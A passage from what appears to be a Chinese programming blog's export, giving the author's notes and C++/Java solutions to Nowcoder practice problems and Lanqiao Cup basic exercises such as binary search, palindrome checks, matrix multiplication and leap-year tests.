class="number">2</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">1</span>&#125;;</span><br><span class="line">    Solution s;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; res = s.maxInWindows(v,<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; res.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;res[i]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="NC101-缺失数字"><a href="#NC101-缺失数字" class="headerlink" title="NC101 缺失数字"></a>NC101 缺失数字</h2><blockquote>
<p>暴力循环写的，，，效率不好，，，</p>
<p>其他思路：</p>
<p>1.通过循环求和，最后通过公式n*(n+1)/2-sum，求得少的值</p>
<p>2.循环条件就是a[i]=i，否则就直接返回结课</p>
<p><del>额，不知道为啥效率都挺低的，，，</del></p>
</blockquote>
<h3 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span><br><span class="line">     *</span><br><span class="line">     * 找缺失数字</span><br><span class="line">     * @param a int整型vector 给定的数字串</span><br><span class="line">     * @return int整型</span><br><span class="line">     *&#x2F;</span><br><span class="line">    int solve(vector&lt;int&gt;&amp; a) &#123;</span><br><span class="line">        int i&#x3D;0;</span><br><span class="line">        while(i&#x3D;&#x3D;a[i])i++;</span><br><span class="line">        return i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="my-exp-2"><a href="#my-exp-2" class="headerlink" title="my exp"></a>my exp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 找缺失数字</span></span><br><span class="line"><span class="comment">     * @param a int整型vector 给定的数字串</span></span><br><span class="line"><span class="comment">     * @return int整型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">solve</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; a)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;a.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i]!=i)&#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a.<span class="built_in">size</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="NC103-反转字符串"><a href="#NC103-反转字符串" class="headerlink" title="NC103 反转字符串"></a>NC103 反转字符串</h2><blockquote>
<p>自我感觉良好，，，，哈哈哈</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 反转字符串</span></span><br><span class="line"><span class="comment">     * @param str string字符串 </span></span><br><span class="line"><span class="comment">     * @return string字符串</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">solve</span><span class="params">(<span class="built_in">string</span> str)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="built_in">string</span> rev;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;str.length();i++)&#123;</span><br><span class="line">            rev = str[i] + rev;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> rev;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="NC105-二分查找-II"><a href="#NC105-二分查找-II" class="headerlink" title="NC105 二分查找-II"></a>NC105 二分查找-II</h2><blockquote>
<p>比较简单的题，，，思路我是对的，但是写的不好，，，。</p>
<p>一个点就在于这个排好序的序列里面可能有重复的元素，所以即使找到了，还要判断前面的数是不是还是答案，用循环即可解决。</p>
</blockquote>
<h3 id="exp-13"><a href="#exp-13" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 如果目标值存在返回下标，否则返回 -1</span></span><br><span class="line"><span class="comment">     * @param nums int整型vector </span></span><br><span class="line"><span class="comment">     * @param target int整型 </span></span><br><span class="line"><span class="comment">     * @return int整型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> l=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> r=nums.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> mid=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(l&lt;=r)&#123;</span><br><span class="line">            mid=(l+r)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid]==target)&#123;</span><br><span class="line">                <span class="keyword">while</span>(nums[mid<span class="number">-1</span>]==nums[mid])&#123;</span><br><span class="line">                    mid--;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[mid]&gt;target)&#123;</span><br><span class="line">                r=mid<span class="number">-1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                l=mid+<span class="number">1</span>; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="NC107-寻找峰值"><a href="#NC107-寻找峰值" class="headerlink" title="NC107 寻找峰值"></a>NC107 寻找峰值</h2><blockquote>
<p>easy，自己写出来了，虽然有点周折</p>
<p>这里有个有意思的是，其实只要判断后面的比前一个大即可，因为这个条件失败往前走，后面的肯定比前面的小，而最后一个如果是峰值也算，故可行，，，</p>
</blockquote>
<h3 id="my-exp-3"><a href="#my-exp-3" class="headerlink" title="my exp"></a>my exp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 寻找最后的山峰</span></span><br><span class="line"><span class="comment">     * @param a int整型一维数组 </span></span><br><span class="line"><span class="comment">     * @param aLen int a数组长度</span></span><br><span class="line"><span class="comment">     * @return int整型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span>* a, <span class="keyword">int</span> aLen)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="keyword">if</span>(a[aLen<span class="number">-1</span>]&gt;a[aLen<span class="number">-2</span>])&#123;<span class="comment">//最后一位是峰值</span></span><br><span class="line">            <span class="keyword">return</span> aLen<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//从后往前找</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=aLen<span class="number">-2</span>;i&gt;<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i]&gt;a[i<span class="number">-1</span>] &amp;&amp; a[i]&gt;a[i+<span class="number">1</span>])&#123;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;a[i];</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="exp-14"><a href="#exp-14" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 寻找最后的山峰</span></span><br><span class="line"><span class="comment">     * @param a int整型一维数组 </span></span><br><span class="line"><span class="comment">     * @param aLen int a数组长度</span></span><br><span class="line"><span class="comment">     * @return int整型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span>* a, <span class="keyword">int</span> aLen)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="keyword">if</span>(a==<span class="literal">nullptr</span> || aLen==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=aLen<span class="number">-1</span>;i&gt;=<span class="number">1</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i]&gt;=a[i<span class="number">-1</span>])&#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="NC141-判断回文"><a href="#NC141-判断回文" class="headerlink" title="NC141 判断回文"></a>NC141 判断回文</h2><blockquote>
<p>emmm，是一道简单题，，，但是我写的麻烦了点，就没有通过，，，，</p>
</blockquote>
<h3 id="my-exp-4"><a href="#my-exp-4" class="headerlink" title="my exp"></a>my exp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @param str string字符串 待判断的字符串</span></span><br><span class="line"><span class="comment">     * @return bool布尔型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">judge</span><span class="params">(<span class="built_in">string</span> str)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="built_in">string</span> rev;</span><br><span class="line">        <span class="keyword">int</span> len = str.length();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len/<span class="number">2</span>;i++)&#123;</span><br><span class="line">            rev = str[i] + rev;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        str = str.substr(len%<span class="number">2</span>==<span class="number">0</span>?len/<span class="number">2</span>:len/<span class="number">2</span>+<span class="number">1</span>,len);</span><br><span class="line">        <span class="keyword">if</span>(rev == str)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="right-exp"><a href="#right-exp" class="headerlink" title="right exp"></a>right exp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">judge</span><span class="params">(<span class="built_in">string</span> str)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;str.length()/<span class="number">2</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(str[i] != str[str.length()<span class="number">-1</span>-i])</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="NC143-矩阵乘法"><a href="#NC143-矩阵乘法" class="headerlink" title="NC143 矩阵乘法"></a>NC143 矩阵乘法</h2><blockquote>
<p>思路比较简单：三层循环，，，，一个公式就出来了，，，</p>
</blockquote>
<h3 id="二维矩阵初始化"><a href="#二维矩阵初始化" class="headerlink" title="二维矩阵初始化"></a>二维矩阵初始化</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">res</span><span class="params">(a.<span class="built_in">size</span>(),<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(a.<span class="built_in">size</span>(),<span class="number">0</span>))</span></span>;</span><br></pre></td></tr></table></figure>
<h3 id="矩阵乘法"><a href="#矩阵乘法" class="headerlink" title="矩阵乘法"></a>矩阵乘法</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; a.<span class="built_in">size</span>(); ++j) &#123;</span><br><span class="line">        <span class="keyword">int</span> t=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; a.<span class="built_in">size</span>(); ++k) &#123;</span><br><span class="line">            t += a[i][k] * b[k][j];</span><br><span class="line">        &#125;</span><br><span class="line">        res[i][j] = t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="exp-15"><a href="#exp-15" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-20.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">res</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; &amp;a,<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; &amp;b)</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">res</span><span class="params">(a.<span class="built_in">size</span>(),<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(a.<span class="built_in">size</span>(),<span class="number">0</span>))</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; a.<span class="built_in">size</span>(); ++j) &#123;</span><br><span class="line">                <span class="keyword">int</span> t=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; a.<span class="built_in">size</span>(); ++k) &#123;</span><br><span class="line">                    t += a[i][k] * b[k][j];</span><br><span class="line">                &#125;</span><br><span class="line">                res[i][j] = t;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; v = &#123;&#123;<span class="number">1</span>,<span class="number">2</span>&#125;,&#123;<span class="number">3</span>,<span class="number">2</span>&#125;&#125;;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; v2 = &#123;&#123;<span class="number">3</span>,<span class="number">4</span>&#125;,&#123;<span class="number">2</span>,<span class="number">1</span>&#125;&#125;;</span><br><span class="line">    Solution s;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; res = s.res(v,v2);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; res.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; res[<span class="number">0</span>].<span class="built_in">size</span>(); ++j) &#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;res[i][j]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">        &#125;<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="NC151-最大公约数"><a href="#NC151-最大公约数" class="headerlink" title="NC151 最大公约数"></a>NC151 最大公约数</h2><blockquote>
<p>一个常用的求最大公约数的方法，<strong>记住他</strong></p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 求出a、b的最大公约数。</span></span><br><span class="line"><span class="comment">     * @param a int </span></span><br><span class="line"><span class="comment">     * @param b int </span></span><br><span class="line"><span class="comment">     * @return int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="keyword">if</span>(a%b==<span class="number">0</span>)<span class="keyword">return</span> b;</span><br><span class="line">        <span class="keyword">return</span> gcd(b,a%b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>牛客网</tag>
      </tags>
  </entry>
  <entry>
    <title>蓝桥杯基础练习</title>
    <url>/2021/01/15/10-28/</url>
    <content><![CDATA[<h2 id="闰年判断"><a href="#闰年判断" class="headerlink" title="闰年判断"></a>闰年判断</h2><blockquote>
<p>根据条件写出表达式即可：</p>
<ol>
<li>年份是4的倍数而不是100的倍数；</li>
<li><ol>
<li>年份是400的倍数。</li>
</ol>
</li>
</ol>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_try;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Year</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> input = <span class="keyword">new</span> Scanner(System.in).nextInt();</span><br><span class="line">		<span class="keyword">if</span>((input % <span class="number">4</span> == <span class="number">0</span> &amp;&amp; input % <span class="number">100</span> !=<span class="number">0</span>) || (input % <span class="number">400</span> == <span class="number">0</span>)) &#123;</span><br><span class="line">			System.out.print(<span class="string">"yes"</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">			System.out.print(<span class="string">"no"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="01字串"><a href="#01字串" class="headerlink" title="01字串"></a>01字串</h2><blockquote>
<p>两种方法</p>
<ol>
<li>五层循环，一个个来</li>
<li>for循环，将十进制转换成二进制即可</li>
</ol>
</blockquote>
<h3 id="方法1：五层循环"><a href="#方法1：五层循环" class="headerlink" title="方法1：五层循环"></a>方法1：五层循环</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_try;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ZeroOne2</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> a =<span class="number">0</span>;a&lt;<span class="number">2</span>;a++) &#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> b =<span class="number">0</span>;b&lt;<span class="number">2</span>;b++) &#123;</span><br><span class="line">				<span class="keyword">for</span>(<span class="keyword">int</span> c =<span class="number">0</span>;c&lt;<span class="number">2</span>;c++) &#123;</span><br><span class="line">					<span class="keyword">for</span>(<span class="keyword">int</span> d =<span class="number">0</span>;d&lt;<span class="number">2</span>;d++) &#123;</span><br><span class="line">						<span class="keyword">for</span>(<span class="keyword">int</span> e =<span class="number">0</span>;e&lt;<span class="number">2</span>;e++) &#123;</span><br><span class="line">							System.out.println(<span class="string">""</span>+a+b+c+d+e);</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="方法2：十进制转二进制"><a href="#方法2：十进制转二进制" class="headerlink" title="方法2：十进制转二进制"></a>方法2：十进制转二进制</h3><ol>
<li>for循环</li>
<li>十进制转二进制</li>
<li>填充字符串长度为5</li>
</ol>
<h4 id="十进制转二进制函数"><a href="#十进制转二进制函数" class="headerlink" title="十进制转二进制函数"></a>十进制转二进制函数</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Integer.toBinaryString(i);</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_try;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ZeroOne</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>;i&lt;<span class="number">32</span>;i++) &#123;</span><br><span class="line">			String s = Integer.toBinaryString(i);</span><br><span class="line">			<span class="keyword">if</span>(s.length()==<span class="number">1</span>) &#123;</span><br><span class="line">				s = <span class="string">"0000"</span> + s;</span><br><span class="line">			&#125;<span class="keyword">else</span> <span class="keyword">if</span>(s.length()==<span class="number">2</span>) &#123;</span><br><span class="line">				s = <span class="string">"000"</span> + s;</span><br><span class="line">			&#125;<span class="keyword">else</span> <span class="keyword">if</span>(s.length()==<span class="number">3</span>) &#123;</span><br><span class="line">				s = <span class="string">"00"</span> + s;</span><br><span class="line">			&#125;<span class="keyword">else</span> <span class="keyword">if</span>(s.length()==<span class="number">4</span>) &#123;</span><br><span class="line">				s = <span class="string">"0"</span> + s;</span><br><span class="line">			&#125;</span><br><span class="line">			System.out.println(s);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="字母图形"><a href="#字母图形" class="headerlink" title="字母图形"></a>字母图形</h2><blockquote>
<p>根据分析得到，字符串的特点是，不断的右移，并且新增的字符是以A为中心的翻转。</p>
<p>解决：通过字符串截取和翻转共同实现。</p>
</blockquote>
<ol>
<li><p>生成A-Z字符串</p>
</li>
<li><p>输入n和m</p>
</li>
<li><p>分两种情况：</p>
<p>第一种：是m大于n，那么左边是翻转，右边是正常序列。</p>
<p>第二种：是m小于n，那么一开始同第一种，后来就都是翻转的序列了</p>
</li>
<li><p>输出</p>
</li>
</ol>
<h3 id="翻转字符串"><a href="#翻转字符串" class="headerlink" title="翻转字符串"></a>翻转字符串</h3><p>是自己实现的一个函数，递归实现。每次解决最后一个字符，放到前面来，其余的递归同样解决，复杂度为O(n)。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//翻转字符串函数</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> String <span class="title">reverse</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(s.length()==<span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(s.length() == <span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> s;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> s.charAt(s.length()-<span class="number">1</span>) + reverse(s.substring(<span class="number">0</span>,s.length()-<span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>答案：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_try;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AtoZ</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="comment">//生成A-Z字符串</span></span><br><span class="line">		String s = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">char</span> start = <span class="string">'A'</span>;</span><br><span class="line">		<span class="keyword">char</span> end = <span class="string">'Z'</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">char</span> i = start;i&lt;=end;i++) &#123;</span><br><span class="line">			s+=i;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//输入</span></span><br><span class="line">		Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">		<span class="keyword">int</span> n = scan.nextInt();</span><br><span class="line">		<span class="keyword">int</span> m = scan.nextInt();</span><br><span class="line">		<span class="comment">//输出结果</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;		</span><br><span class="line">			<span class="keyword">if</span>(i&lt;=m) &#123;</span><br><span class="line">				<span class="comment">//第一种情况是左边加上翻转的+右边正确的</span></span><br><span class="line">				System.out.println(reverse(s.substring(<span class="number">1</span>,i+<span class="number">1</span>))+s.substring(<span class="number">0</span>,m-i));</span><br><span class="line">			&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="comment">//第二种情况是都是左边翻转的</span></span><br><span class="line">				System.out.println(reverse(s.substring(i-m+<span class="number">1</span>,i+<span class="number">1</span>)));</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//翻转字符串函数</span></span><br><span class="line">	<span class="function"><span class="keyword">static</span> String <span class="title">reverse</span><span class="params">(String s)</span> 